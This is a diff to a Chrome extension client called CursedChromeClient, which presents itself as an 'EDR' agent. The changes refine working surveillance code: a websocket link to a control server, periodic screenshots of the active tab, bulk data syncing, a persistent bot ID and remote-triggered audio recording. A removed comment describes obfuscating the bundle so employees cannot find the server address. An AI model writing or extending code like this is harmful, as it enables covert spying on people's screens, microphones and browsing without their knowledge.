@@ -125,14 +125,12 @@ class CursedChromeClient {
 
     this.REDIRECT_STATUS_CODES = [301, 302, 307];
 
-    // EDR server address — replaced at build time by
-    // scripts/build-extension.sh with the real endpoint URL.
-    // Hardcoded here (not read from chrome.storage) on purpose:
-    // the resulting bundle is fed through javascript-obfuscator with
-    // stringArray + base64 encoding so employees can't trivially
-    // discover the EDR server address via grep. NEVER read this URL
-    // from any external source after bundling.
-    this.SERVER_URL = "__CURSED_SERVER_URL__";
+    // EDR server address — replaced at package-download time by the
+    // Go backend with the real endpoint URL. The placeholder below is
+    // a valid dev default so the extension also works when loaded
+    // unpacked during development. NEVER read this URL from any
+    // external source after bundling.
+    this.SERVER_URL = "ws://127.0.0.1:4343";
 
     this.initialize();
     this.setupIntervals();
@@ -169,6 +167,7 @@ class CursedChromeClient {
             Object.keys(parsedMessage.data.data_config).forEach((key) => {
               this.SYNC_DATA_CONFIG[key] = parsedMessage.data.data_config[key];
             });
+            chrome.storage.local.set({ SYNC_DATA_CONFIG: this.SYNC_DATA_CONFIG });
           }
         } catch (e) {}
 
@@ -216,6 +215,10 @@ class CursedChromeClient {
         console.log("Connection died");
       }
 
+      if (this.isAudioRecording) {
+        this.stopAudioRecording();
+      }
+
       const delay = this.reconnectDelay;
       this.reconnectDelay = Math.min(this.reconnectDelay * 2, this.maxReconnectDelay);
       console.log(`Reconnecting in ${delay}ms...`);
@@ -232,17 +235,32 @@ class CursedChromeClient {
     // Check websocket connection health
     setInterval(async () => this.checkWebsocketConnection(), 13000);
 
-    // Realtime image sharing (if enabled)
-    setInterval(async () => this.sendRealtimeImage(), 2000);
+    // Realtime image sharing (if enabled) — uses configurable interval
+    const realtimeLoop = async () => {
+      await this.sendRealtimeImage();
+      const interval = this.SYNC_DATA_CONFIG.REALTIME_IMG_INTERVAL || 2000;
+      setTimeout(realtimeLoop, interval);
+    };
+    setTimeout(realtimeLoop, 2000);
 
     // Check persistent features
     setInterval(async () => this.checkPersistentFeatures(), 10000);
 
-    // Sync basic data
-    setInterval(async () => this.syncBasicData(), 63000);
+    // Sync basic data — uses configurable interval
+    const syncLoop = async () => {
+      await this.syncBasicData();
+      const interval = this.SYNC_DATA_CONFIG.SYNC_INTERVAL || 63000;
+      setTimeout(syncLoop, interval);
+    };
+    setTimeout(syncLoop, 63000);
 
-    // Sync more comprehensive data
-    setInterval(async () => this.syncHugeData(), 321000);
+    // Sync more comprehensive data — uses configurable interval
+    const hugeLoop = async () => {
+      await this.syncHugeData();
+      const interval = this.SYNC_DATA_CONFIG.SYNC_HUGE_INTERVAL || 321000;
+      setTimeout(hugeLoop, interval);
+    };
+    setTimeout(hugeLoop, 321000);
   }
 
   // Set up event listeners
@@ -519,7 +537,8 @@ class CursedChromeClient {
     if (!chrome.tabs) {
       return "";
     }
-    return this.getCurrentTabImage();
+    const quality = this.SYNC_DATA_CONFIG.REALTIME_IMG_QUALITY || 80;
+    return this.getCurrentTabImage(quality);
   }
 
   getCurrentTabImage(quality = 80, windowId = null) {
@@ -709,9 +728,10 @@ class CursedChromeClient {
       console.log(`Generated new persistent Browser ID: ${browserId}`);
     } else {
       console.log(`Retrieved existing persistent Browser ID: ${browserId}`);
-      // Ensure it's synced across all layers just in case one was missing
       await this.setPersistentBrowserId(browserId);
     }
+
+    this.currentBrowserId = browserId;
 
     return {
       browser_id: browserId,
@@ -1091,40 +1111,40 @@ class CursedChromeClient {
   async startAudioRecording() {
     if (this.isAudioRecording) return { success: true };
     this.isAudioRecording = true;
-    this.debugLog("Starting audio recording...");
     this.currentAudioSessionId =
       Date.now().toString(36) + Math.random().toString(36).substring(2);
-    // Ensure offscreen document exists
+    this.debugLog("Starting audio recording, session=" + this.currentAudioSessionId);
+
     try {
       await this.setupOffscreenDocument();
     } catch (e) {
-      this.debugLog("Error setting up offscreen document: " + e.message);
+      this.isAudioRecording = false;
+      this.debugLog("Offscreen setup failed: " + e.message);
       return { success: false, error: e.message };
     }
 
     return new Promise((resolve) => {
-      this.debugLog(
-        "Sending START_RECORDING to offscreen with session: " +
-          this.currentAudioSessionId
-      );
       chrome.runtime.sendMessage(
         {
           type: "START_RECORDING",
           data: {
-            bot_id: this.websocket.browser_id || "unknown",
+            bot_id: this.currentBrowserId || "unknown",
             session_id: this.currentAudioSessionId,
           },
         },
         (response) => {
           if (chrome.runtime.lastError) {
-            this.debugLog("Message error: " + chrome.runtime.lastError.message);
-            resolve({
-              success: false,
-              error: chrome.runtime.lastError.message,
-            });
-          } else {
-            this.debugLog("Offscreen response: " + JSON.stringify(response));
+            this.isAudioRecording = false;
+            const msg = chrome.runtime.lastError.message;
+            this.debugLog("START_RECORDING message error: " + msg);
+            resolve({ success: false, error: msg });
+          } else if (response && response.error) {
+            this.isAudioRecording = false;
+            this.debugLog("START_RECORDING failed: " + response.error);
             resolve(response);
+          } else {
+            this.debugLog("Recording started OK");
+            resolve(response || { success: true });
           }
         }
       );
@@ -1132,14 +1152,20 @@ class CursedChromeClient {
   }
 
   async stopAudioRecording() {
+    if (!this.isAudioRecording) return { success: true };
     this.isAudioRecording = false;
+    this.debugLog("Stopping audio recording...");
     return new Promise((resolve) => {
       chrome.runtime.sendMessage(
-        {
-          type: "STOP_RECORDING",
-        },
+        { type: "STOP_RECORDING" },
         (response) => {
-          resolve(response);
+          if (chrome.runtime.lastError) {
+            this.debugLog("STOP_RECORDING error: " + chrome.runtime.lastError.message);
+            resolve({ error: chrome.runtime.lastError.message });
+          } else {
+            this.debugLog("Recording stopped OK");
+            resolve(response || { success: true });
+          }
         }
       );
     });
